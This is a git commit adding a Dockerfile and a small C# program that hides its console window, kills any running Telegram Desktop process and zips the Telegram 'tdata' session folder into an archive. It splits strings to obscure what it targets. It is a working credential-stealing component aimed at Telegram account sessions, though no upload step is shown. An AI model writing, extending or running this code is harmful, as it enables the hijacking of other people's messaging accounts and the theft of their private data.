596991dafd86d377280809f0ac9af4eda5181a6b
Alex Granovsky <compfaculty@users.noreply.github.com>
2023-10-10 19:47:14 +0300

    init

---
+++ Dockerfile
@@ -0,0 +1,18 @@
+﻿FROM mcr.microsoft.com/dotnet/runtime:8.0 AS base
+WORKDIR /app
+
+FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build
+WORKDIR /src
+COPY ["tdata.csproj", "./"]
+RUN dotnet restore "tdata.csproj"
+COPY . .
+WORKDIR "/src/"
+RUN dotnet build "tdata.csproj" -c Release -o /app/build
+
+FROM build AS publish
+RUN dotnet publish "tdata.csproj" -c Release -o /app/publish /p:UseAppHost=false
+
+FROM base AS final
+WORKDIR /app
+COPY --from=publish /app/publish .
+ENTRYPOINT ["dotnet", "tdata.dll"]
---
+++ Program.cs
@@ -0,0 +1,73 @@
+﻿using System.Diagnostics;
+using System.IO.Compression;
+using System.Runtime.InteropServices;
+
+[DllImport("kernel32.dll", SetLastError = true)]
+static extern bool FreeConsole();
+
+FreeConsole();
+
+var telegramFolderPath = GetTelegramFolderPath();
+
+
+if (string.IsNullOrEmpty(telegramFolderPath))
+{
+    var p = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");
+    if (Directory.Exists(p)) ;
+    {
+        telegramFolderPath = p;
+    }
+}
+
+if (!string.IsNullOrEmpty(telegramFolderPath) && Directory.Exists($"{telegramFolderPath}\\tdata"))
+{
+    var t5 = @"tda";
+    var t6 = @"ta.zip";
+    var destinationZip = $"{AppDomain.CurrentDomain.BaseDirectory}{t5}{t6}";
+    if (File.Exists(destinationZip))
+    {
+        File.Delete(destinationZip);
+    }
+
+    ZipFile.CreateFromDirectory($"{telegramFolderPath}\\tdata", destinationZip,
+        CompressionLevel.Fastest, false);
+}
+
+return;
+
+
+static string? GetTelegramFolderPath()
+{
+    string? ret = null;
+    foreach (var process in Process.GetProcessesByName("Telegr" + "am"))
+    {
+        try
+        {
+            ret = Path.GetDirectoryName(process.MainModule?.FileName);
+        }
+        catch
+        {
+            // Ignoring any exception and continue checking other processes
+        }
+    }
+
+    KillTelegramProcesses();
+
+    return ret;
+}
+
+static void KillTelegramProcesses()
+{
+    foreach (var process in Process.GetProcessesByName("Tel" + "egram"))
+    {
+        try
+        {
+            process.Kill();
+            process.WaitForExit();
+        }
+        catch (Exception)
+        {
+            // ignored
+        }
+    }
+}
